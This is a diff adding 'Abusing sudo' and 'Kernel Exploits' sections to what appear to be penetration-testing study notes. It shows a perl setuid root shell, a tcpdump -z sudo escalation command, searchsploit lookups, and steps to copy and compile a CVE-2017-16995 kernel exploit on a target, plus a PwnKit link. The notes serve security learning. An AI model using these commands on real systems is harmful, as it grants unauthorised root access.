@@ -1857,3 +1857,63 @@ https://gtfobins.github.io/ to find exploitable binaries
 ```
 perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 ```
+### Abusing sudo
+can list sudo privs with
+```
+sudo -l
+```
+ permissions in /etc/sudoers
+
+attempt to abuse tcpdump with sudo privilege
+```
+COMMAND='id'
+TF=$(mktemp)
+echo "$COMMAND" > $TF
+chmod +x $TF
+sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+```
+
+it fails due tp app-armor, can verify in syslog
+
+```
+cat /var/log/syslog | grep tcpdump
+```
+
+can check app-armor status as root
+```
+ su - root
+aa-status
+```
+
+### Kernel Exploits
+enumerate kernel data
+```
+cat /etc/issue
+uname -r 
+arch
+```
+
+searchsploit
+```
+searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
+```
+
+after finding exploit we must read it
+```
+cp /usr/share/exploitdb/exploits/linux/local/45010.c .
+head 45010.c -n 20
+```
+
+if we have ssh access, we can SCP binary to target machine
+```
+scp cve-2017-16995.c joe@192.168.123.216:
+```
+
+then we can compile on their achine
+```
+gcc cve-2017-16995.c -o cve-2017-16995
+```
+
+PwnKit can be used for privesc on many kernels
+
+https://www.exploit-db.com/exploits/50689
